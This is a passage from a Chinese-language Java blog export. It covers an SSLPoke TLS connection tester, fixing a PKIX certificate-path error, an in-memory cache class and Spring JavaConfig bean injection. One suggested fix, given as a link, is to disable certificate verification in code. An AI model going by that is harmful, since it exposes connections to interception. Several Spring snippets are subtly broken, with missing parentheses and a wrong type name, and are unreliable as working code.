獨立的)<br>QQ 希望之後不要遇到類似這個問題</p>\n<p><strong>2020-07-28</strong></p>\n<h2 id=\"Java-SSLPoke-檢查\"><a href=\"#Java-SSLPoke-檢查\" class=\"headerlink\" title=\"Java SSLPoke 檢查\"></a>Java SSLPoke 檢查</h2><p>檢查也有找到這個方法可用<a href=\"https://dotblogs.com.tw/grayyin/2018/07/12/145718\" target=\"_blank\" rel=\"noopener\">[JAVA] SSL handshake連線測試工具 SSLPoke | 阿輝的零碎筆記 - 點部落</a></p>\n<p>SSLPoke.java<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.PrintStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.net.ssl.SSLHandshakeException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.net.ssl.SSLSocket;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SSLPoke</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">SSLPoke</span><span class=\"params\">()</span> </span>&#123;&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] paramArrayOfString)</span></span></span><br><span class=\"line\"><span class=\"function\">  </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (paramArrayOfString.length != <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">      System.err.println(<span class=\"string\">\"Utility to debug Java connections to SSL servers\"</span>);</span><br><span class=\"line\">      System.err.println(<span class=\"string\">\"Usage: \"</span>);</span><br><span class=\"line\">      System.err.println(<span class=\"string\">\"  java \"</span> + SSLPoke.class.getName() + <span class=\"string\">\" &lt;host&gt; &lt;port&gt;\"</span>);</span><br><span class=\"line\">      System.err.println(<span class=\"string\">\"or for more debugging:\"</span>);</span><br><span class=\"line\">      System.err.println(<span class=\"string\">\"  java -Djavax.net.debug=ssl \"</span> + SSLPoke.class.getName() + <span class=\"string\">\" &lt;host&gt; &lt;port&gt;\"</span>);</span><br><span class=\"line\">      System.err.println();</span><br><span class=\"line\">      System.err.println(<span class=\"string\">\"Eg. to test the SSL certificate at https://localhost, use\"</span>);</span><br><span class=\"line\">      System.err.println(<span class=\"string\">\"  java \"</span> + SSLPoke.class.getName() + <span class=\"string\">\" localhost 443\"</span>);</span><br><span class=\"line\">      System.exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">      SSLSocketFactory localSSLSocketFactory = (SSLSocketFactory)SSLSocketFactory.getDefault();</span><br><span class=\"line\">      SSLSocket localSSLSocket = (SSLSocket)localSSLSocketFactory.createSocket(paramArrayOfString[<span class=\"number\">0</span>], Integer.parseInt(paramArrayOfString[<span class=\"number\">1</span>]));</span><br><span class=\"line\">      </span><br><span class=\"line\">      java.io.InputStream localInputStream = localSSLSocket.getInputStream();</span><br><span class=\"line\">      java.io.OutputStream localOutputStream = localSSLSocket.getOutputStream();</span><br><span class=\"line\">      </span><br><span class=\"line\"></span><br><span class=\"line\">      localOutputStream.write(<span class=\"number\">1</span>);</span><br><span class=\"line\">      </span><br><span class=\"line\">      <span class=\"keyword\">while</span> (localInputStream.available() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        System.out.print(localInputStream.read());</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      System.out.println(<span class=\"string\">\"Successfully connected\"</span>);</span><br><span class=\"line\">      System.exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">catch</span> (SSLHandshakeException localSSLHandshakeException) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (localSSLHandshakeException.getCause() != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        localSSLHandshakeException.getCause().printStackTrace();</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        localSSLHandshakeException.printStackTrace();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (Exception localException) &#123;</span><br><span class=\"line\">      localException.printStackTrace();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    System.exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">## 先打包成class</span><br><span class=\"line\">$ javac SSLPoke.java</span><br><span class=\"line\">$ java SSLPoke www.google.com 443</span><br></pre></td></tr></table></figure>\n<p>連線成功會顯示<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ java SSLPoke www.google.com 443</span><br><span class=\"line\">Successfully connected</span><br></pre></td></tr></table></figure></p>\n<p>失敗就會出現一大堆錯</p>\n<h3 id=\"handling-exception-javax-net-ssl-SSLHandshakeException-sun-security-validator-ValidatorException-PKIX-path-building-failed-sun-security-provider-certpath-SunCertPathBuilderException-unable-to-find-valid-certification-path-to-requested-target\"><a href=\"#handling-exception-javax-net-ssl-SSLHandshakeException-sun-security-validator-ValidatorException-PKIX-path-building-failed-sun-security-provider-certpath-SunCertPathBuilderException-unable-to-find-valid-certification-path-to-requested-target\" class=\"headerlink\" title=\"handling exception: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\"></a>handling exception: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"> handling exception: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target</span><br><span class=\"line\">sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target</span><br></pre></td></tr></table></figure>\n<p>不知道是哪裡出問題<br>但後來發現是根憑證沒有這個</p>\n<ol>\n<li>指定jks(加好根憑證)或自己加<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -Djavax.net.ssl.trustStore= </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 吃公司內部jks 無可以設定</span></span><br><span class=\"line\"><span class=\"comment\">#java -Djavax.net.debug=ssl  -Djavax.net.ssl.trustStore=./jssecacerts.jks SSLPoke xxxx.aaa.com.tw 443</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p><a href=\"https://blog.csdn.net/iihero/article/details/7584162\" target=\"_blank\" rel=\"noopener\">获取访问目标主机的有效SSL/TLS证书 (无法直接得到证书时)_iihero@CSDN-CSDN博客</a></p>\n<ol start=\"2\">\n<li>程式忽略掉<br><a href=\"https://blog.csdn.net/tiantianchuqiji/article/details/76639796\" target=\"_blank\" rel=\"noopener\">证书不安全解决HttpClient 如何忽略证书验证 - ALLOW_ALL_HOSTNAME_VERIFIER_tiantianchuqiji的博客-CSDN博客</a></li>\n</ol>\n"},{"title":"Java 實作 Memory Cache 方法小記","url":"/blog/2021/01/07/Java-%E5%AF%A6%E4%BD%9C-Memory-Cache-%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/","content":"<p>最近程式會頻繁撈取資料庫<br>想有沒有減輕資料庫負擔<br>後來想到之前 swoole 課程有提到 Memory Cache<br>今天網路找了一下 Java 實作<br>發現還滿多實作可以直接使用</p>\n<a id=\"more\"></a>\n<ol>\n<li>CachesExplained</li>\n</ol>\n<ul>\n<li><a href=\"https://github.com/google/guava/wiki/CachesExplained\" target=\"_blank\" rel=\"noopener\">CachesExplained · google/guava Wiki · GitHub</a></li>\n<li><a href=\"http://ifeve.com/google-guava-cachesexplained/\" target=\"_blank\" rel=\"noopener\">[Google Guava] 3-缓存 | 并发编程网 – ifeve.com</a></li>\n<li><a href=\"https://crossoverjie.top/2018/07/23/java-senior/ConcurrentHashMap/\" target=\"_blank\" rel=\"noopener\">HashMap? ConcurrentHashMap? 相信看完这篇没人能难住你！ | crossoverJie’s Blog</a></li>\n</ul>\n<ol start=\"2\">\n<li><a href=\"https://github.com/lixk/ECache\" target=\"_blank\" rel=\"noopener\">GitHub - lixk/ECache: simple memory cache for Java</a></li>\n</ol>\n<p>簡單實用，我是使用這個範例實作<br>就專案能用</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.Executors;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.Future;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.ScheduledExecutorService;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.TimeUnit;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * simple memory cache</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@author</span> lixk</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ECache</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t * key-value data set</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> Map&lt;String, Entity&gt; DATA_BASE = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t * use scheduled executor to clean expired data</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> ScheduledExecutorService CLEANER = Executors.newSingleThreadScheduledExecutor();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t * put data to cache</span></span><br><span class=\"line\"><span class=\"comment\">\t *</span></span><br><span class=\"line\"><span class=\"comment\">\t * <span class=\"doctag\">@param</span> key   unique identification for data</span></span><br><span class=\"line\"><span class=\"comment\">\t * <span class=\"doctag\">@param</span> value your data</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">put</span><span class=\"params\">(String key, Object value)</span> </span>&#123;</span><br><span class=\"line\">\t\tECache.put(key, value, <span class=\"number\">0L</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t * put data to cache</span></span><br><span class=\"line\"><span class=\"comment\">\t *</span></span><br><span class=\"line\"><span class=\"comment\">\t * <span class=\"doctag\">@param</span> key    unique identification for data</span></span><br><span class=\"line\"><span class=\"comment\">\t * <span class=\"doctag\">@param</span> value  your data</span></span><br><span class=\"line\"><span class=\"comment\">\t * <span class=\"doctag\">@param</span> expire data survival time in milliseconds</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">put</span><span class=\"params\">(<span class=\"keyword\">final</span> String key, <span class=\"keyword\">final</span> Object value, <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> expire)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//clean old data</span></span><br><span class=\"line\">\t\tECache.remove(key);</span><br><span class=\"line\">\t\t<span class=\"comment\">//set schedule task</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (expire &gt; <span class=\"number\">0L</span>) &#123;</span><br><span class=\"line\">\t\t\tFuture future = CLEANER.schedule(<span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"meta\">@Override</span></span><br><span class=\"line\">\t\t\t\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\">//remove data</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">synchronized</span> (ECache.class) &#123;</span><br><span class=\"line\">\t\t\t\t\t\tDATA_BASE.remove(key);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;, expire, TimeUnit.MILLISECONDS);</span><br><span class=\"line\">\t\t\tDATA_BASE.put(key, <span class=\"keyword\">new</span> Entity(value, expire, future));</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tDATA_BASE.put(key, <span class=\"keyword\">new</span> Entity(value, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>));</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t * read data from cache</span></span><br><span class=\"line\"><span class=\"comment\">\t *</span></span><br><span class=\"line\"><span class=\"comment\">\t * <span class=\"doctag\">@param</span> key unique identification for data</span></span><br><span class=\"line\"><span class=\"comment\">\t * <span class=\"doctag\">@return</span> data bound to the key</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">static</span> &lt;T&gt; <span class=\"function\">T <span class=\"title\">get</span><span class=\"params\">(String key)</span> </span>&#123;</span><br><span class=\"line\">\t\tEntity entity = DATA_BASE.get(key);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (entity != <span class=\"keyword\">null</span> &amp;&amp; entity.isAlive()) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> (T) entity.value;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t * remove cached data</span></span><br><span class=\"line\"><span class=\"comment\">\t *</span></span><br><span class=\"line\"><span class=\"comment\">\t * <span class=\"doctag\">@param</span> key unique identification for data</span></span><br><span class=\"line\"><span class=\"comment\">\t * <span class=\"doctag\">@return</span> data bound to the key</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">static</span> &lt;T&gt; <span class=\"function\">T <span class=\"title\">remove</span><span class=\"params\">(String key)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//remove data from data set</span></span><br><span class=\"line\">\t\tEntity entity = DATA_BASE.remove(key);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (entity == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">//cancel the schedule task</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (entity.future != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">\t\t\tentity.future.cancel(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> entity.isAlive() ? (T) entity.value : <span class=\"keyword\">null</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t * cached data entity</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Entity</span> </span>&#123;</span><br><span class=\"line\">\t\tObject value;</span><br><span class=\"line\">\t\tLong expirationTime;</span><br><span class=\"line\">\t\tFuture future;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tEntity(Object value, Long expire, Future future) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">this</span>.value = value;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">this</span>.expirationTime = (expire == <span class=\"keyword\">null</span> ? <span class=\"keyword\">null</span> : System.currentTimeMillis() + expire);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">this</span>.future = future;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t\t * Judging whether the entity is still alive</span></span><br><span class=\"line\"><span class=\"comment\">\t\t *</span></span><br><span class=\"line\"><span class=\"comment\">\t\t * <span class=\"doctag\">@return</span> boolean</span></span><br><span class=\"line\"><span class=\"comment\">\t\t */</span></span><br><span class=\"line\">\t\t<span class=\"function\"><span class=\"keyword\">boolean</span> <span class=\"title\">isAlive</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.expirationTime == <span class=\"keyword\">null</span> || <span class=\"keyword\">this</span>.expirationTime &gt;= System.currentTimeMillis();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li><a href=\"http://hulen.com/java-in-memory-cache/\" target=\"_blank\" rel=\"noopener\">Java in Memory Cache – Geekout – From one propeller head to another!</a></li>\n</ol>\n<ul>\n<li><a href=\"https://www.cnblogs.com/mingziday/p/4910004.html\" target=\"_blank\" rel=\"noopener\">利用LRUMap 设计缓存 - mingziday - 博客园</a></li>\n</ul>\n<p>彩蛋:</p>\n<p><a href=\"https://cizixs.com/2018/08/26/what-is-istio/\" target=\"_blank\" rel=\"noopener\">什么是 istio | Cizixs Write Here</a><br><a href=\"http://lab1.liulichao.com/2016/08/15/user-agent-utils.html\" target=\"_blank\" rel=\"noopener\">【技术教程】利用User-agent-utils获取用户浏览器、操作系统等信息 - 数字人文技术实验室</a><br><a href=\"https://segmentfault.com/a/1190000023011928\" target=\"_blank\" rel=\"noopener\">新一代的微服务架构 Service Mesh - SegmentFault 思否</a><br><a href=\"https://github.com/qiao-zhi/Spring-Struts-Mybaits-Shiro\" target=\"_blank\" rel=\"noopener\">GitHub - qiao-zhi/Spring-Struts-Mybaits-Shiro: Spring+Struts2+Mybatis+Shiro的权限管理</a></p>\n","categories":["Java"],"tags":["java"]},{"title":"JavaConfig 設定 bean 物件","url":"/blog/2020/05/13/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/","content":"<p>這邊不使用自動載入</p>\n<a id=\"more\"></a>\n<h2 id=\"一般注入\"><a href=\"#一般注入\" class=\"headerlink\" title=\"一般注入\"></a>一般注入</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> ...</span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> UserDao userDaoNormal&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> UserDaoNormal();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"建構式注入\"><a href=\"#建構式注入\" class=\"headerlink\" title=\"建構式注入\"></a>建構式注入</h2><h3 id=\"一般方法\"><a href=\"#一般方法\" class=\"headerlink\" title=\"一般方法\"></a>一般方法</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> ...</span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> UserService <span class=\"title\">userServiceNormal</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        UserDao userDao = userDaoNormal();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> UserService(userDao);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"更好的方法-不多一個-instance\"><a href=\"#更好的方法-不多一個-instance\" class=\"headerlink\" title=\"更好的方法(不多一個 instance )\"></a>更好的方法(不多一個 instance )</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> ...</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> UserDao userDaoNormal&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> UserDaoNormal();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> UserService <span class=\"title\">userServiceNormal</span><span class=\"params\">(userDao userDao)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> UserService(userDao);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"setter-注入方法\"><a href=\"#setter-注入方法\" class=\"headerlink\" title=\"setter 注入方法\"></a>setter 注入方法</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> ...</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> UserDao userDaoNormal&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> UserDaoNormal();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> UserService <span class=\"title\">setUserDao</span><span class=\"params\">(userDao userDao)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> UserService(userDao);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"任意方法也可以\"><a href=\"#任意方法也可以\" class=\"headerlink\" title=\"任意方法也可以\"></a>任意方法也可以</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> ...</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> UserDao userDaoNormal&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> UserDaoNormal();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> UserService <span class=\"title\">prepareUserDao</span><span class=\"params\">(userDao userDao)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> UserService(userDao);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"解決衝突方法\"><a href=\"#解決衝突方法\" class=\"headerlink\" title=\"解決衝突方法\"></a>解決衝突方法</h2><p>自動注入和 JavaConfig 解決方案一致</p>\n<h3 id=\"Primary\"><a href=\"#Primary\" class=\"headerlink\" title=\"@Primary\"></a>@Primary</h3><h3 id=\"Qualifier-“xxxXxxx”\"><a href=\"#Qualifier-“xxxXxxx”\" class=\"headerlink\" title=\"Qualifier(“xxxXxxx”)\"></a>Qualifier(“xxxXxxx”)</h3><p>@Qualifier(“xxXxxx”)  宣告 or 參數</p>\n<p>@Qualifier(“xxxXxxx”) 宣告</p>\n<h3 id=\"Bean-命名方法\"><a href=\"#Bean-命名方法\" class=\"headerlink\" title=\"@Bean 命名方法\"></a>@Bean 命名方法</h3><p>默認 @Bean 方法名稱</p>\n","categories":["Java"],"tags":["spring","java"]},{"title":"Java 雜記","url":"/blog/2020/03/28/Java-%E9%9B%9C%E8%A8%98/","content":"<p>TODO: 尚未整理完成</p>\n<a id=\"more\"></a>\n<p><a href=\"https://javarevisited.blogspot.com/2019/10/the-java-developer-roadmap.html\" target=\"_blank\" rel=\"noopener\">The 2020 Java Developer RoadMap</a></p>\n<p><a href=\"https://javarevisited.blogspot.com/2018/01/top-20-libraries-and-apis-for-java-programmers.html\" target=\"_blank\" rel=\"noopener\">Top 20 Libraries and APIs Java Developer should know</a></p>\n<h2 id=\"Exception\"><a href=\"#Exception\" class=\"headerlink\" title=\"Exception\"></a>Exception</h2><p><a href=\"https://medium.com/@clu1022/java%E7%AD%86%E8%A8%98-exception-%E8%88%87-error-dbdf9a9b0909\" target=\"_blank\" rel=\"noopener\">Java筆記 — Exception 與 Error - Carl - Medium</a></p>\n<h2 id=\"io-close\"><a href=\"#io-close\" class=\"headerlink\" title=\"io close\"></a>io close</h2><p><a href=\"https://www.cnblogs.com/shenpengyan/p/6117814.html\" target=\"_blank\" rel=\"noopener\">Java：浅谈InputStream的close方法 - 白羊沈歌 - 博客园</a><br><a href=\"http://www.51gjie.com/java/701.html\" target=\"_blank\" rel=\"noopener\">Java OutputStream.close()关闭并释放输出流资源</a></p>\n<p><a href=\"https://github.com/Snailclimb/JavaGuide#mybatis\" target=\"_blank\" rel=\"noopener\">Snailclimb/JavaGuide: 【Java学习+面试指南】 一份涵盖大部分Java程序员所需要掌握的核心知识。</a></p>\n<h3 id=\"Memory-mapped-File\"><a href=\"#Memory-mapped-File\" class=\"headerlink\" title=\"Memory-mapped File\"></a>Memory-mapped File</h3><p><a href=\"http://quxiao.github.io/blog/2011/03/31/java-memory-mapped-file-stream-and-the-i-o-performance-comparison/\" target=\"_blank\" rel=\"noopener\">Java中Stream和Memory-mapped File的I/O性能对比 - Xavier’s Blog</a></p>\n<h3 id=\"stack-heap-記憶體相關\"><a href=\"#stack-heap-記憶體相關\" class=\"headerlink\" title=\"stack /heap 記憶體相關\"></a>stack /heap 記憶體相關</h3><p><a href=\"https://www.facebook.com/groups/748837991920629/permalink/1658181240986295/\" target=\"_blank\" rel=\"noopener\">(1) Java技術與認證交流平台</a></p>\n<h2 id=\"Java-Web\"><a href=\"#Java-Web\" class=\"headerlink\" title=\"Java Web\"></a>Java Web</h2><h3 id=\"Session\"><a href=\"#Session\" class=\"headerlink\" title=\"Session\"></a>Session</h3><ul>\n<li><p><a href=\"https://www.runoob.com/jsp/jsp-session.html\" target=\"_blank\" rel=\"noopener\">JSP Session | 菜鸟教程</a><br>每一個 war 檔 session 都是分開的，可用上面 JSP 測試</p>\n</li>\n<li><p><a href=\"https://github.com/L316476844/distributed-session\" target=\"_blank\" rel=\"noopener\">L316476844/distributed-session: 集群/分布式环境Session的几种策略 实现步骤和方式 1、粘性session 2、应用服务器间的session复制共享 3、基于cache DB缓存的session共享</a></p>\n</li>\n<li><p><a href=\"https://blog.csdn.net/sun305355024sun/article/details/6928370\" target=\"_blank\" rel=\"noopener\">跨war包session同步<em>数据库</em>阳光下的立人-CSDN博客</a></p>\n</li>\n</ul>\n<h2 id=\"spring-core\"><a href=\"#spring-core\" class=\"headerlink\" title=\"spring core\"></a>spring core</h2><p><a href=\"https://www.ctolib.com/docs/sfile/Heart-First-JavaWeb/index.html\" target=\"_blank\" rel=\"noopener\">介绍 | 走心的Java Web入门开发教程</a><br><a href=\"https://openhome.cc/Gossip/SpringGossip/index.html\" target=\"_blank\" rel=\"noopener\">開源框架: Spring Gossip</a><br><a 